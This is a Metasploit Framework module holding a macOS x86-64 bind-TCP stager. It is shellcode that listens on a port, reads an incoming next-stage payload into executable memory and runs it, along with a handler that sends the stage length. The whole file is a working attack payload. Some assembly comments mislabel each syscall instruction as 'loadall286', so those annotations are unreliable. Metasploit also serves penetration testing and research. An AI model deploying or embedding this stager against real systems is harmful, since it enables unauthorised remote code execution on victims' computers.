##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'

module Metasploit3

  include Msf::Payload::Stager

  handler module_name: 'Msf::Handler::BindTcp'

  def initialize(info = { })
    super(merge_info(info,
      'Name'        => 'Bind TCP Stager',
      'Description' => 'Listen, read length, read buffer, execute',
      'Author'      => 'nemo <nemo[at]felinemenace.org>',
      'License'     => MSF_LICENSE,
      'Platform'    => 'osx',
      'Arch'        => ARCH_X86_64,
      'Convention'  => 'sockedi',
      'Stager'      =>
      {
        'Offsets' => { 'LPORT' => [ 31, 'n'] },
        'Payload' =>
          "\xB8\x61\x00\x00\x02" +     # mov eax,0x2000061
          "\x6A\x02" +                 # push byte +0x2
          "\x5F" +                     # pop rdi
          "\x6A\x01" +                 # push byte +0x1
          "\x5E" +                     # pop rsi
          "\x48\x31\xD2" +             # xor rdx,rdx
          "\x0F\x05" +                 # loadall286
          "\x48\x89\xC7" +             # mov rdi,rax
          "\xB8\x68\x00\x00\x02" +     # mov eax,0x2000068
          "\x48\x31\xF6" +             # xor rsi,rsi
          "\x56" +                     # push rsi
          "\xBE\x00\x02\x15\xB3" +     # mov esi,0xb3150200
          "\x56" +                     # push rsi
          "\x48\x89\xE6" +             # mov rsi,rsp
          "\x6A\x10" +                 # push byte +0x10
          "\x5A" +                     # pop rdx
          "\x0F\x05" +                 # loadall286
          "\xB8\x6A\x00\x00\x02" +     # mov eax,0x200006a
          "\x48\x31\xF6" +             # xor rsi,rsi
          "\x48\xFF\xC6" +             # inc rsi
          "\x49\x89\xFC" +             # mov r12,rdi
          "\x0F\x05" +                 # loadall286
          "\xB8\x1E\x00\x00\x02" +     # mov eax,0x200001e
          "\x4C\x89\xE7" +             # mov rdi,r12
          "\x48\x89\xE6" +             # mov rsi,rsp
          "\x48\x89\xE2" +             # mov rdx,rsp
          "\x48\x83\xEA\x04" +         # sub rdx,byte +0x4
          "\x0F\x05" +                 # loadall286
          "\x49\x89\xC5" +             # mov r13,rax
          "\x48\x89\xC7" +             # mov rdi,rax
          "\xB8\x1D\x00\x00\x02" +     # mov eax,0x200001d
          "\x48\x31\xC9" +             # xor rcx,rcx
          "\x51" +                     # push rcx
          "\x48\x89\xE6" +             # mov rsi,rsp
          "\xBA\x04\x00\x00\x00" +     # mov edx,0x4
          "\x4D\x31\xC0" +             # xor r8,r8
          "\x4D\x31\xD2" +             # xor r10,r10
          "\x0F\x05" +                 # loadall286
          "\x41\x5B" +                 # pop r11
          "\x4C\x89\xDE" +             # mov rsi,r11
          "\x81\xE6\x00\xF0\xFF\xFF" + # and esi,0xfffff000
          "\x81\xC6\x00\x10\x00\x00" + # add esi,0x1000
          "\xB8\xC5\x00\x00\x02" +     # mov eax,0x20000c5
          "\x48\x31\xFF" +             # xor rdi,rdi
          "\x48\xFF\xCF" +             # dec rdi
          "\xBA\x07\x00\x00\x00" +     # mov edx,0x7
          "\x41\xBA\x02\x10\x00\x00" + # mov r10d,0x1002
          "\x49\x89\xF8" +             # mov r8,rdi
          "\x4D\x31\xC9" +             # xor r9,r9
          "\x0F\x05" +                 # loadall286
          "\x48\x89\xC6" +             # mov rsi,rax
          "\x56" +                     # push rsi
          "\x4C\x89\xEF" +             # mov rdi,r13
          "\x48\x31\xC9" +             # xor rcx,rcx
          "\x4C\x89\xDA" +             # mov rdx,r11
          "\x4D\x31\xC0" +             # xor r8,r8
          "\x4D\x31\xD2" +             # xor r10,r10
          "\xB8\x1D\x00\x00\x02" +     # mov eax,0x200001d
          "\x0F\x05" +                 # loadall286
          "\x58" +                     # pop rax
          "\xFF\xD0"                   # call rax
      }
    ))
  end

  def handle_intermediate_stage(conn, p)
    #
    # Our stager payload expects to see a next-stage length first.
    #
    conn.put([p.length].pack('V'))
  end
end
